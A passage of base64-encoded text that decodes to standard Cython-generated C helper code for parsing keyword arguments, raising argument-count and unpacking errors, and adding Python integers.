XJzdF9rd19hcmcsCiAgICBjb25zdCBjaGFyICpmdW5jdGlvbl9uYW1lKQp7CiAgICBQeV9zc2l6ZV90IHBvcyA9IDA7CiAgICBQeU9iamVjdCAqa2V5ID0gTlVMTDsKICAgIF9fUHl4X0JFR0lOX0NSSVRJQ0FMX1NFQ1RJT04oa3dkcyk7CiAgICB3aGlsZSAoUHlEaWN0X05leHQoa3dkcywgJnBvcywgJmtleSwgTlVMTCkpIHsKICAgICAgICBQeU9iamVjdCoqIGNvbnN0ICpuYW1lID0gZmlyc3Rfa3dfYXJnOwogICAgICAgIHdoaWxlICgqbmFtZSAmJiAoKipuYW1lICE9IGtleSkpIG5hbWUrKzsKICAgICAgICBpZiAoISpuYW1lKSB7CiAgICAgICAgICAgICNpZiBDWVRIT05fQVZPSURfQk9SUk9XRURfUkVGUwogICAgICAgICAgICBQeV9JTkNSRUYoa2V5KTsKICAgICAgICAgICAgI2VuZGlmCiAgICAgICAgICAgIHNpemVfdCBpbmRleF9mb3VuZCA9IDA7CiAgICAgICAgICAgIGludCBjbXAgPSBfX1B5eF9NYXRjaEtleXdvcmRBcmcoa2V5LCBhcmduYW1lcywgZmlyc3Rfa3dfYXJnLCAmaW5kZXhfZm91bmQsIGZ1bmN0aW9uX25hbWUpOwogICAgICAgICAgICBpZiAoY21wICE9IDEpIHsKICAgICAgICAgICAgICAgIGlmIChjbXAgPT0gMCkgewogICAgICAgICAgICAgICAgICAgIFB5RXJyX0Zvcm1hdChQeUV4Y19UeXBlRXJyb3IsCiAgICAgICAgICAgICAgICAgICAgICAgICIlcygpIGdvdCBhbiB1bmV4cGVjdGVkIGtleXdvcmQgYXJndW1lbnQgJyVVJyIsCiAgICAgICAgICAgICAgICAgICAgICAgIGZ1bmN0aW9uX25hbWUsIGtleSk7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAjaWYgQ1lUSE9OX0FWT0lEX0JPUlJPV0VEX1JFRlMKICAgICAgICAgICAgICAgIFB5X0RFQ1JFRihrZXkpOwogICAgICAgICAgICAgICAgI2VuZGlmCiAgICAgICAgICAgICAgICBicmVhazsKICAgICAgICAgICAgfQogICAgICAgICAgICAjaWYgQ1lUSE9OX0FWT0lEX0JPUlJPV0VEX1JFRlMKICAgICAgICAgICAgUHlfREVDUkVGKGtleSk7CiAgICAgICAgICAgICNlbmRpZgogICAgICAgIH0KICAgIH0KICAgIF9fUHl4X0VORF9DUklUSUNBTF9TRUNUSU9OKCk7CiAgICBhc3NlcnQoUHlFcnJfT2NjdXJyZWQoKSk7Cn0Kc3RhdGljIGludCBfX1B5eF9QYXJzZUtleXdvcmREaWN0KAogICAgUHlPYmplY3QgKmt3ZHMsCiAgICBQeU9iamVjdCAqKiBjb25zdCBhcmduYW1lc1tdLAogICAgUHlPYmplY3QgKnZhbHVlc1tdLAogICAgUHlfc3NpemVfdCBudW1fcG9zX2FyZ3MsCiAgICBQeV9zc2l6ZV90IG51bV9rd2FyZ3MsCiAgICBjb25zdCBjaGFyKiBmdW5jdGlvbl9uYW1lLAogICAgaW50IGlnbm9yZV91bmtub3duX2t3YXJncykKewogICAgUHlPYmplY3QqKiBjb25zdCAqbmFtZTsKICAgIFB5T2JqZWN0KiogY29uc3QgKmZpcnN0X2t3X2FyZyA9IGFyZ25hbWVzICsgbnVtX3Bvc19hcmdzOwogICAgUHlfc3NpemVfdCBleHRyYWN0ZWQgPSAwOwojaWYgIUNZVEhPTl9DT01QSUxJTkdfSU5fUFlQWSB8fCBkZWZpbmVkKFB5QXJnX1ZhbGlkYXRlS2V5d29yZEFyZ3VtZW50cykKICAgIGlmICh1bmxpa2VseSghUHlBcmdfVmFsaWRhdGVLZXl3b3JkQXJndW1lbnRzKGt3ZHMpKSkgcmV0dXJuIC0xOwojZW5kaWYKICAgIG5hbWUgPSBmaXJzdF9rd19hcmc7CiAgICB3aGlsZSAoKm5hbWUgJiYgbnVtX2t3YXJncyA+IGV4dHJhY3RlZCkgewogICAgICAgIFB5T2JqZWN0ICoga2V5ID0gKipuYW1lOwogICAgICAgIFB5T2JqZWN0ICp2YWx1ZTsKICAgICAgICBpbnQgZm91bmQgPSAwOwogICAgICAgICNpZiBfX1BZWF9MSU1JVEVEX1ZFUlNJT05fSEVYID49IDB4MDMwZDAwMDAKICAgICAgICBmb3VuZCA9IFB5RGljdF9HZXRJdGVtUmVmKGt3ZHMsIGtleSwgJnZhbHVlKTsKICAgICAgICAjZWxzZQogICAgICAgIHZhbHVlID0gUHlEaWN0X0dldEl0ZW1XaXRoRXJyb3Ioa3dkcywga2V5KTsKICAgICAgICBpZiAodmFsdWUpIHsKICAgICAgICAgICAgUHlfSU5DUkVGKHZhbHVlKTsKICAgICAgICAgICAgZm91bmQgPSAxOwogICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgIGlmICh1bmxpa2VseShQeUVycl9PY2N1cnJlZCgpKSkgZ290byBiYWQ7CiAgICAgICAgfQogICAgICAgICNlbmRpZgogICAgICAgIGlmIChmb3VuZCkgewogICAgICAgICAgICBpZiAodW5saWtlbHkoZm91bmQgPCAwKSkgZ290byBiYWQ7CiAgICAgICAgICAgIHZhbHVlc1tuYW1lLWFyZ25hbWVzXSA9IHZhbHVlOwogICAgICAgICAgICBleHRyYWN0ZWQrKzsKICAgICAgICB9CiAgICAgICAgbmFtZSsrOwogICAgfQogICAgaWYgKG51bV9rd2FyZ3MgPiBleHRyYWN0ZWQpIHsKICAgICAgICBpZiAoaWdub3JlX3Vua25vd25fa3dhcmdzKSB7CiAgICAgICAgICAgIGlmICh1bmxpa2VseShfX1B5eF9WYWxpZGF0ZUR1cGxpY2F0ZVBvc0FyZ3Moa3dkcywgYXJnbmFtZXMsIGZpcnN0X2t3X2FyZywgZnVuY3Rpb25fbmFtZSkgPT0gLTEpKQogICAgICAgICAgICAgICAgZ290byBiYWQ7CiAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgX19QeXhfUmVqZWN0VW5rbm93bktleXdvcmQoa3dkcywgYXJnbmFtZXMsIGZpcnN0X2t3X2FyZywgZnVuY3Rpb25fbmFtZSk7CiAgICAgICAgICAgIGdvdG8gYmFkOwogICAgICAgIH0KICAgIH0KICAgIHJldHVybiAwOwpiYWQ6CiAgICByZXR1cm4gLTE7Cn0Kc3RhdGljIGludCBfX1B5eF9QYXJzZUtleXdvcmREaWN0VG9EaWN0KAogICAgUHlPYmplY3QgKmt3ZHMsCiAgICBQeU9iamVjdCAqKiBjb25zdCBhcmduYW1lc1tdLAogICAgUHlPYmplY3QgKmt3ZHMyLAogICAgUHlPYmplY3QgKnZhbHVlc1tdLAogICAgUHlfc3NpemVfdCBudW1fcG9zX2FyZ3MsCiAgICBjb25zdCBjaGFyKiBmdW5jdGlvbl9uYW1lKQp7CiAgICBQeU9iamVjdCoqIGNvbnN0ICpuYW1lOwogICAgUHlPYmplY3QqKiBjb25zdCAqZmlyc3Rfa3dfYXJnID0gYXJnbmFtZXMgKyBudW1fcG9zX2FyZ3M7CiAgICBQeV9zc2l6ZV90IGxlbjsKI2lmICFDWVRIT05fQ09NUElMSU5HX0lOX1BZUFkgfHwgZGVmaW5lZChQeUFyZ19WYWxpZGF0ZUtleXdvcmRBcmd1bWVudHMpCiAgICBpZiAodW5saWtlbHkoIVB5QXJnX1ZhbGlkYXRlS2V5d29yZEFyZ3VtZW50cyhrd2RzKSkpIHJldHVybiAtMTsKI2VuZGlmCiAgICBpZiAoUHlEaWN0X1VwZGF0ZShrd2RzMiwga3dkcykgPCAwKSBnb3RvIGJhZDsKICAgIG5hbWUgPSBmaXJzdF9rd19hcmc7CiAgICB3aGlsZSAoKm5hbWUpIHsKICAgICAgICBQeU9iamVjdCAqa2V5ID0gKipuYW1lOwogICAgICAgIFB5T2JqZWN0ICp2YWx1ZTsKI2lmICFDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJICYmIChQWV9WRVJTSU9OX0hFWCA+PSAweDAzMGQwMEEyIHx8IGRlZmluZWQoUHlEaWN0X1BvcCkpCiAgICAgICAgaW50IGZvdW5kID0gUHlEaWN0X1BvcChrd2RzMiwga2V5LCAmdmFsdWUpOwogICAgICAgIGlmIChmb3VuZCkgewogICAgICAgICAgICBpZiAodW5saWtlbHkoZm91bmQgPCAwKSkgZ290byBiYWQ7CiAgICAgICAgICAgIHZhbHVlc1tuYW1lLWFyZ25hbWVzXSA9IHZhbHVlOwogICAgICAgIH0KI2VsaWYgX19QWVhfTElNSVRFRF9WRVJTSU9OX0hFWCA+PSAweDAzMGQwMDAwCiAgICAgICAgaW50IGZvdW5kID0gUHlEaWN0X0dldEl0ZW1SZWYoa3dkczIsIGtleSwgJnZhbHVlKTsKICAgICAgICBpZiAoZm91bmQpIHsKICAgICAgICAgICAgaWYgKHVubGlrZWx5KGZvdW5kIDwgMCkpIGdvdG8gYmFkOwogICAgICAgICAgICB2YWx1ZXNbbmFtZS1hcmduYW1lc10gPSB2YWx1ZTsKICAgICAgICAgICAgaWYgKHVubGlrZWx5KFB5RGljdF9EZWxJdGVtKGt3ZHMyLCBrZXkpIDwgMCkpIGdvdG8gYmFkOwogICAgICAgIH0KI2Vsc2UKICAgICNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT04KICAgICAgICB2YWx1ZSA9IF9QeURpY3RfUG9wKGt3ZHMyLCBrZXksIGt3ZHMyKTsKICAgICNlbHNlCiAgICAgICAgdmFsdWUgPSBfX1B5eF9DYWxsVW5ib3VuZENNZXRob2QyKCZfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF91bWV0aG9kX1B5RGljdF9UeXBlX3BvcCwga3dkczIsIGtleSwga3dkczIpOwogICAgI2VuZGlmCiAgICAgICAgaWYgKHZhbHVlID09IGt3ZHMyKSB7CiAgICAgICAgICAgIFB5X0RFQ1JFRih2YWx1ZSk7CiAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgaWYgKHVubGlrZWx5KCF2YWx1ZSkpIGdvdG8gYmFkOwogICAgICAgICAgICB2YWx1ZXNbbmFtZS1hcmduYW1lc10gPSB2YWx1ZTsKICAgICAgICB9CiNlbmRpZgogICAgICAgIG5hbWUrKzsKICAgIH0KICAgIGxlbiA9IFB5RGljdF9TaXplKGt3ZHMyKTsKICAgIGlmIChsZW4gPiAwKSB7CiAgICAgICAgcmV0dXJuIF9fUHl4X1ZhbGlkYXRlRHVwbGljYXRlUG9zQXJncyhrd2RzLCBhcmduYW1lcywgZmlyc3Rfa3dfYXJnLCBmdW5jdGlvbl9uYW1lKTsKICAgIH0gZWxzZSBpZiAodW5saWtlbHkobGVuID09IC0xKSkgewogICAgICAgIGdvdG8gYmFkOwogICAgfQogICAgcmV0dXJuIDA7CmJhZDoKICAgIHJldHVybiAtMTsKfQpzdGF0aWMgaW50IF9fUHl4X1BhcnNlS2V5d29yZHNUdXBsZSgKICAgIFB5T2JqZWN0ICprd2RzLAogICAgUHlPYmplY3QgKiBjb25zdCAqa3d2YWx1ZXMsCiAgICBQeU9iamVjdCAqKiBjb25zdCBhcmduYW1lc1tdLAogICAgUHlPYmplY3QgKmt3ZHMyLAogICAgUHlPYmplY3QgKnZhbHVlc1tdLAogICAgUHlfc3NpemVfdCBudW1fcG9zX2FyZ3MsCiAgICBQeV9zc2l6ZV90IG51bV9rd2FyZ3MsCiAgICBjb25zdCBjaGFyKiBmdW5jdGlvbl9uYW1lLAogICAgaW50IGlnbm9yZV91bmtub3duX2t3YXJncykKewogICAgUHlPYmplY3QgKmtleSA9IE5VTEw7CiAgICBQeU9iamVjdCoqIGNvbnN0ICogbmFtZTsKICAgIFB5T2JqZWN0KiogY29uc3QgKmZpcnN0X2t3X2FyZyA9IGFyZ25hbWVzICsgbnVtX3Bvc19hcmdzOwogICAgZm9yIChQeV9zc2l6ZV90IHBvcyA9IDA7IHBvcyA8IG51bV9rd2FyZ3M7IHBvcysrKSB7CiNpZiBDWVRIT05fQVZPSURfQk9SUk9XRURfUkVGUwogICAgICAgIGtleSA9IF9fUHl4X1B5U2VxdWVuY2VfSVRFTShrd2RzLCBwb3MpOwojZWxzZQogICAgICAgIGtleSA9IF9fUHl4X1B5VHVwbGVfR0VUX0lURU0oa3dkcywgcG9zKTsKI2VuZGlmCiNpZiAhQ1lUSE9OX0FTU1VNRV9TQUZFX01BQ1JPUwogICAgICAgIGlmICh1bmxpa2VseSgha2V5KSkgZ290byBiYWQ7CiNlbmRpZgogICAgICAgIG5hbWUgPSBmaXJzdF9rd19hcmc7CiAgICAgICAgd2hpbGUgKCpuYW1lICYmICgqKm5hbWUgIT0ga2V5KSkgbmFtZSsrOwogICAgICAgIGlmICgqbmFtZSkgewogICAgICAgICAgICBQeU9iamVjdCAqdmFsdWUgPSBrd3ZhbHVlc1twb3NdOwogICAgICAgICAgICB2YWx1ZXNbbmFtZS1hcmduYW1lc10gPSBfX1B5eF9OZXdSZWYodmFsdWUpOwogICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgIHNpemVfdCBpbmRleF9mb3VuZCA9IDA7CiAgICAgICAgICAgIGludCBjbXAgPSBfX1B5eF9NYXRjaEtleXdvcmRBcmcoa2V5LCBhcmduYW1lcywgZmlyc3Rfa3dfYXJnLCAmaW5kZXhfZm91bmQsIGZ1bmN0aW9uX25hbWUpOwogICAgICAgICAgICBpZiAoY21wID09IDEpIHsKICAgICAgICAgICAgICAgIFB5T2JqZWN0ICp2YWx1ZSA9IGt3dmFsdWVzW3Bvc107CiAgICAgICAgICAgICAgICB2YWx1ZXNbaW5kZXhfZm91bmRdID0gX19QeXhfTmV3UmVmKHZhbHVlKTsKICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgIGlmICh1bmxpa2VseShjbXAgPT0gLTEpKSBnb3RvIGJhZDsKICAgICAgICAgICAgICAgIGlmIChrd2RzMikgewogICAgICAgICAgICAgICAgICAgIFB5T2JqZWN0ICp2YWx1ZSA9IGt3dmFsdWVzW3Bvc107CiAgICAgICAgICAgICAgICAgICAgaWYgKHVubGlrZWx5KFB5RGljdF9TZXRJdGVtKGt3ZHMyLCBrZXksIHZhbHVlKSkpIGdvdG8gYmFkOwogICAgICAgICAgICAgICAgfSBlbHNlIGlmICghaWdub3JlX3Vua25vd25fa3dhcmdzKSB7CiAgICAgICAgICAgICAgICAgICAgZ290byBpbnZhbGlkX2tleXdvcmQ7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgI2lmIENZVEhPTl9BVk9JRF9CT1JST1dFRF9SRUZTCiAgICAgICAgUHlfREVDUkVGKGtleSk7CiAgICAgICAga2V5ID0gTlVMTDsKICAgICAgICAjZW5kaWYKICAgIH0KICAgIHJldHVybiAwOwppbnZhbGlkX2tleXdvcmQ6CiAgICBQeUVycl9Gb3JtYXQoUHlFeGNfVHlwZUVycm9yLAogICAgICAgICIlcygpIGdvdCBhbiB1bmV4cGVjdGVkIGtleXdvcmQgYXJndW1lbnQgJyVVJyIsCiAgICAgICAgZnVuY3Rpb25fbmFtZSwga2V5KTsKICAgIGdvdG8gYmFkOwpiYWQ6CiAgICAjaWYgQ1lUSE9OX0FWT0lEX0JPUlJPV0VEX1JFRlMKICAgIFB5X1hERUNSRUYoa2V5KTsKICAgICNlbmRpZgogICAgcmV0dXJuIC0xOwp9CnN0YXRpYyBpbnQgX19QeXhfUGFyc2VLZXl3b3JkcygKICAgIFB5T2JqZWN0ICprd2RzLAogICAgUHlPYmplY3QgKiBjb25zdCAqa3d2YWx1ZXMsCiAgICBQeU9iamVjdCAqKiBjb25zdCBhcmduYW1lc1tdLAogICAgUHlPYmplY3QgKmt3ZHMyLAogICAgUHlPYmplY3QgKnZhbHVlc1tdLAogICAgUHlfc3NpemVfdCBudW1fcG9zX2FyZ3MsCiAgICBQeV9zc2l6ZV90IG51bV9rd2FyZ3MsCiAgICBjb25zdCBjaGFyKiBmdW5jdGlvbl9uYW1lLAogICAgaW50IGlnbm9yZV91bmtub3duX2t3YXJncykKewogICAgaWYgKENZVEhPTl9NRVRIX0ZBU1RDQUxMICYmIGxpa2VseShQeVR1cGxlX0NoZWNrKGt3ZHMpKSkKICAgICAgICByZXR1cm4gX19QeXhfUGFyc2VLZXl3b3Jkc1R1cGxlKGt3ZHMsIGt3dmFsdWVzLCBhcmduYW1lcywga3dkczIsIHZhbHVlcywgbnVtX3Bvc19hcmdzLCBudW1fa3dhcmdzLCBmdW5jdGlvbl9uYW1lLCBpZ25vcmVfdW5rbm93bl9rd2FyZ3MpOwogICAgZWxzZSBpZiAoa3dkczIpCiAgICAgICAgcmV0dXJuIF9fUHl4X1BhcnNlS2V5d29yZERpY3RUb0RpY3Qoa3dkcywgYXJnbmFtZXMsIGt3ZHMyLCB2YWx1ZXMsIG51bV9wb3NfYXJncywgZnVuY3Rpb25fbmFtZSk7CiAgICBlbHNlCiAgICAgICAgcmV0dXJuIF9fUHl4X1BhcnNlS2V5d29yZERpY3Qoa3dkcywgYXJnbmFtZXMsIHZhbHVlcywgbnVtX3Bvc19hcmdzLCBudW1fa3dhcmdzLCBmdW5jdGlvbl9uYW1lLCBpZ25vcmVfdW5rbm93bl9rd2FyZ3MpOwp9CgoKc3RhdGljIHZvaWQgX19QeXhfUmFpc2VBcmd0dXBsZUludmFsaWQoCiAgICBjb25zdCBjaGFyKiBmdW5jX25hbWUsCiAgICBpbnQgZXhhY3QsCiAgICBQeV9zc2l6ZV90IG51bV9taW4sCiAgICBQeV9zc2l6ZV90IG51bV9tYXgsCiAgICBQeV9zc2l6ZV90IG51bV9mb3VuZCkKewogICAgUHlfc3NpemVfdCBudW1fZXhwZWN0ZWQ7CiAgICBjb25zdCBjaGFyICptb3JlX29yX2xlc3M7CiAgICBpZiAobnVtX2ZvdW5kIDwgbnVtX21pbikgewogICAgICAgIG51bV9leHBlY3RlZCA9IG51bV9taW47CiAgICAgICAgbW9yZV9vcl9sZXNzID0gImF0IGxlYXN0IjsKICAgIH0gZWxzZSB7CiAgICAgICAgbnVtX2V4cGVjdGVkID0gbnVtX21heDsKICAgICAgICBtb3JlX29yX2xlc3MgPSAiYXQgbW9zdCI7CiAgICB9CiAgICBpZiAoZXhhY3QpIHsKICAgICAgICBtb3JlX29yX2xlc3MgPSAiZXhhY3RseSI7CiAgICB9CiAgICBQeUVycl9Gb3JtYXQoUHlFeGNfVHlwZUVycm9yLAogICAgICAgICAgICAgICAgICIlLjIwMHMoKSB0YWtlcyAlLjhzICUiIENZVEhPTl9GT1JNQVRfU1NJWkVfVCAiZCBwb3NpdGlvbmFsIGFyZ3VtZW50JS4xcyAoJSIgQ1lUSE9OX0ZPUk1BVF9TU0laRV9UICJkIGdpdmVuKSIsCiAgICAgICAgICAgICAgICAgZnVuY19uYW1lLCBtb3JlX29yX2xlc3MsIG51bV9leHBlY3RlZCwKICAgICAgICAgICAgICAgICAobnVtX2V4cGVjdGVkID09IDEpID8gIiIgOiAicyIsIG51bV9mb3VuZCk7Cn0KCgpzdGF0aWMgQ1lUSE9OX0lOTElORSB2b2lkIF9fUHl4X1JhaXNlVG9vTWFueVZhbHVlc0Vycm9yKFB5X3NzaXplX3QgZXhwZWN0ZWQpIHsKICAgIFB5RXJyX0Zvcm1hdChQeUV4Y19WYWx1ZUVycm9yLAogICAgICAgICAgICAgICAgICJ0b28gbWFueSB2YWx1ZXMgdG8gdW5wYWNrIChleHBlY3RlZCAlIiBDWVRIT05fRk9STUFUX1NTSVpFX1QgImQpIiwgZXhwZWN0ZWQpOwp9CgoKc3RhdGljIENZVEhPTl9JTkxJTkUgdm9pZCBfX1B5eF9SYWlzZU5lZWRNb3JlVmFsdWVzRXJyb3IoUHlfc3NpemVfdCBpbmRleCkgewogICAgUHlFcnJfRm9ybWF0KFB5RXhjX1ZhbHVlRXJyb3IsCiAgICAgICAgICAgICAgICAgIm5lZWQgbW9yZSB0aGFuICUiIENZVEhPTl9GT1JNQVRfU1NJWkVfVCAiZCB2YWx1ZSUuMXMgdG8gdW5wYWNrIiwKICAgICAgICAgICAgICAgICBpbmRleCwgKGluZGV4ID09IDEpID8gIiIgOiAicyIpOwp9CgoKc3RhdGljIENZVEhPTl9JTkxJTkUgaW50IF9fUHl4X0l0ZXJGaW5pc2godm9pZCkgewogICAgUHlPYmplY3QqIGV4Y190eXBlOwogICAgX19QeXhfUHlUaHJlYWRTdGF0ZV9kZWNsYXJlCiAgICBfX1B5eF9QeVRocmVhZFN0YXRlX2Fzc2lnbgogICAgZXhjX3R5cGUgPSBfX1B5eF9QeUVycl9DdXJyZW50RXhjZXB0aW9uVHlwZSgpOwogICAgaWYgKHVubGlrZWx5KGV4Y190eXBlKSkgewogICAgICAgIGlmICh1bmxpa2VseSghX19QeXhfUHlFcnJfR2l2ZW5FeGNlcHRpb25NYXRjaGVzKGV4Y190eXBlLCBQeUV4Y19TdG9wSXRlcmF0aW9uKSkpCiAgICAgICAgICAgIHJldHVybiAtMTsKICAgICAgICBfX1B5eF9QeUVycl9DbGVhcigpOwogICAgICAgIHJldHVybiAwOwogICAgfQogICAgcmV0dXJuIDA7Cn0KCgpzdGF0aWMgaW50IF9fUHl4X0l0ZXJuZXh0VW5wYWNrRW5kQ2hlY2soUHlPYmplY3QgKnJldHZhbCwgUHlfc3NpemVfdCBleHBlY3RlZCkgewogICAgaWYgKHVubGlrZWx5KHJldHZhbCkpIHsKICAgICAgICBQeV9ERUNSRUYocmV0dmFsKTsKICAgICAgICBfX1B5eF9SYWlzZVRvb01hbnlWYWx1ZXNFcnJvcihleHBlY3RlZCk7CiAgICAgICAgcmV0dXJuIC0xOwogICAgfQogICAgcmV0dXJuIF9fUHl4X0l0ZXJGaW5pc2goKTsKfQoKCiNpZiAhQ1lUSE9OX0NPTVBJTElOR19JTl9QWVBZCnN0YXRpYyBQeU9iamVjdCogX19QeXhfRmFsbGJhY2tfX19QeXhfUHlMb25nX0FkZE9iakMoUHlPYmplY3QgKm9wMSwgUHlPYmplY3QgKm9wMiwgaW50IGlucGxhY2UpIHsKICAgIHJldHVybiAoaW5wbGFjZSA/IFB5TnVtYmVyX0luUGxhY2VBZGQgOiBQeU51bWJlcl9BZGQpKG9wMSwgb3AyKTsKfQojaWYgQ1lUSE9OX1VTRV9QWUxPTkdfSU5URVJOQUxTCnN0YXRpYyBQeU9iamVjdCogX19QeXhfVW5wYWNrZWRfX19QeXhfUHlMb25nX0FkZE9iakMoUHlPYmplY3QgKm9wMSwgUHlPYmplY3QgKm9wMiwgbG9uZyBpbnR2YWwsIGludCBpbnBsYWNlLCBpbnQgemVyb2RpdmlzaW9uX2NoZWNrKSB7CiAgICBDWVRIT05fTUFZQkVfVU5VU0VEX1ZBUihpbnBsYWNlKTsKICAgIENZVEhPTl9VTlVTRURfVkFSKHplcm9kaXZpc2lvbl9jaGVjayk7CiAgICBjb25zdCBsb25nIGIgPSBpbnR2YWw7CiAgICBsb25nIGEsIHg7CiNpZmRlZiBIQVZFX0xPTkdfTE9ORwogICAgY29uc3QgUFlfTE9OR19MT05HIGxsYiA9IGludHZhbDsKICAgIFBZX0xPTkdfTE9ORyBsbGEsIGxseDsKI2VuZGlmCiAgICBpZiAodW5saWtlbHkoX19QeXhfUHlMb25nX0lzWmVybyhvcDEpKSkgewogICAgICAgIHJldHVybiBfX1B5eF9OZXdSZWYob3AyKTsKICAgIH0KICAgIGlmICh1bmxpa2VseSghX19QeXhfUHlMb25nX0NvbXBhY3RBc0xvbmcob3AxLCAmYSkpKSB7CiAgICAgICAgY29uc3QgZGlnaXQqIGRpZ2l0cyA9IF9fUHl4X1B5TG9uZ19EaWdpdHMob3AxKTsKICAgICAgICBjb25zdCBQeV9zc2l6ZV90IHNpemUgPSBfX1B5eF9QeUxvbmdfU2lnbmVkRGlnaXRDb3VudChvcDEpOwogICAgICAgIHN3aXRjaCAoc2l6ZSkgewogICAgICAgICAgICBjYXNlIC0yOgogICAgICAgICAgICAgICAgaWYgKDggKiBzaXplb2YobG9uZykgLSAxID4gMiAqIFB5TG9uZ19TSElGVCkgewogICAgICAgICAgICAgICAgICAgIGEgPSAtKGxvbmcpICgoKCgodW5zaWduZWQgbG9uZylkaWdpdHNbMV0pIDw8IFB5TG9uZ19TSElGVCkgfCAodW5zaWduZWQgbG9uZylkaWdpdHNbMF0pKTsKICAgICAgICAgICAgICAgICAgICBicmVhazsKICAgICAgICAgICAgICAgICNpZmRlZiBIQVZFX0xPTkdfTE9ORwogICAgICAgICAgICAgICAgfSBlbHNlIGlmICg4ICogc2l6ZW9mKFBZX0xPTkdfTE9ORykgLSAxID4gMiAqIFB5TG9uZ19TSElGVCkgewogICAgICAgICAgICAgICAgICAgIGxsYSA9IC0oUFlfTE9OR19MT05HKSAoKCgoKHVuc2lnbmVkIFBZX0xPTkdfTE9ORylkaWdpdHNbMV0pIDw8IFB5TG9uZ19TSElGVCkgfCAodW5zaWduZWQgUFlfTE9OR19MT05HKWRpZ2l0c1swXSkpOwogICAgICAgICAgICAgICAgICAgIGdvdG8gbG9uZ19sb25nOwogICAgICAgICAgICAgICAgI2VuZGlmCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBDWVRIT05fRkFMTFRIUk9VR0g7CiAgICAgICAgICAgIGNhc2UgMjoKICAgICAgICAgICAgICAgIGlmICg4ICogc2l6ZW9mKGxvbmcpIC0gMSA+IDIgKiBQeUxvbmdfU0hJRlQpIHsKICAgICAgICAgICAgICAgICAgICBhID0gKGxvbmcpICgoKCgodW5zaWduZWQgbG9uZylkaWdpdHNbMV0pIDw8IFB5TG9uZ19TSElGVCkgfCAodW5zaWduZWQgbG9uZylkaWdpdHNbMF0pKTsKICAgICAgICAgICAgICAgICAgICBicmVhazsKICAgICAgICAgICAgICAgICNpZmRlZiBIQVZFX0xPTkdfTE9ORwogICAgICAgICAgICAgICAgfSBlbHNlIGlmICg4ICogc2l6ZW9mKFBZX0xPTkdfTE9ORykgLSAxID4gMiAqIFB5TG9uZ19TSElGVCkgewogICAgICAgICAgICAgICAgICAgIGxsYSA9IChQWV9MT05HX0xPTkcpICgoKCgodW5zaWduZWQgUFlfTE9OR19MT05HKWRpZ2l0c1sxXSkgPDwgUHlMb25nX1NISUZUKSB8ICh1bnNpZ25lZCBQWV9MT05HX0xPTkcpZGlnaXRzWzBdKSk7CiAgICAgICAgICAgICAgICAgICAgZ290byBsb25nX2xvbmc7CiAgICAgICAgICAgICAgICAjZW5kaWYKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIENZVEhPTl9GQUxMVEhST1VHSDsKICAgICAgICAgICAgY2FzZSAtMzoKICAgICAgICAgICAgICAgIGlmICg4ICogc2l6ZW9mKGxvbmcpIC0gMSA+IDMgKiBQeUxvbmdfU0hJRlQpIHsKICAgICAgICAgICAgICAgICAgICBhID0gLShsb25nKSAoKCgoKCgodW5zaWduZWQgbG9uZylkaWdpdHNbMl0pIDw8IFB5TG9uZ19TSElGVCkgfCAodW5zaWduZWQgbG9uZylkaWdpdHNbMV0pIDw8IFB5TG9uZ19TSElGVCkgfCAodW5zaWduZWQgbG9uZylkaWdpdHNbMF0pKTsKICAgICAgICAgICAgICAgICAgICBicmVhazsKICAgICAgICAgICAgICAgICNpZmRlZiBIQVZFX0xPTkdfTE9ORwogICAgICAgICAgICAgICAgfSBlbHNlIGlmICg4ICogc2l6ZW9mKFBZX0xPTkdfTE9ORykgLSAxID4gMyAqIFB5TG9uZ19TSElGVCkgewogICAgICAgICAgICAgICAgICAgIGxsYSA9IC0oUFlfTE9OR19MT05HKSAoKCgoKCgodW5zaWduZWQgUFlfTE9OR19MT05HKWRpZ2l0c1syXSkgPDwgUHlMb25nX1NISUZUKSB8ICh1bnNpZ25lZCBQWV9MT05HX0xPTkcpZGlnaXRzWzFdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKHVuc2lnbmVkIFBZX0xPTkdfTE9ORylkaWdpdHNbMF0pKTsKICAgICAgICAgICAgICAgICAgICBnb3RvIGxvbmdfbG9uZzsKICAgICAgICAgICAgICAgICNlbmRpZgogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgQ1lUSE9OX0ZBTExUSFJPVUdIOwogICAgICAgICAgICBjYXNlIDM6CiAgICAgICAgICAgICAgICBpZiAoOCAqIHNpemVvZihsb25nKSAtIDEgPiAzICogUHlMb25nX1NISUZUKSB7CiAgICAgICAgICAgICAgICAgICAgYSA9IChsb25nKSAoKCgoKCgodW5zaWduZWQgbG9uZylkaWdpdHNbMl0pIDw8IFB5TG9uZ19TSElGVCkgfCAodW5zaWduZWQgbG9uZylkaWdpdHNbMV0pIDw8IFB5TG9uZ19TSElGVCkgfCAodW5zaWduZWQgbG9uZylkaWdpdHNbMF0pKTsKICAgICAgICAgICAgICAgICAgICBicmVhazsKICAgICAgICAgICAgICAgICNpZmRlZiBIQVZFX0xPTkdfTE9ORwogICAgICAgICAgICAgICAgfSBlbHNlIGlmICg4ICogc2l6ZW9mKFBZX0xPTkdfTE9ORykgLSAxID4gMyAqIFB5TG9uZ19TSElGVCkgewogICAgICAgICAgICAgICAgICAgIGxsYSA9IChQWV9MT05HX0xPTkcpICgoKCgoKCh1bnNpZ25lZCBQWV9MT05HX0xPTkcpZGlnaXRzWzJdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKHVuc2lnbmVkIFBZX0xPTkdfTE9ORylkaWdpdHNbMV0pIDw8IFB5TG9uZ19TSElGVCkgfCAodW5zaWduZWQgUFlfTE9OR19MT05HKWRpZ2l0c1swXSkpOwogICAgICAgICAgICAgICAgICAgIGdvdG8gbG9uZ19sb25nOwogICAgICAgICAgICAgICAgI2VuZGlmCiAgICAgICAgICAgICAgICB9CiAgICAgIC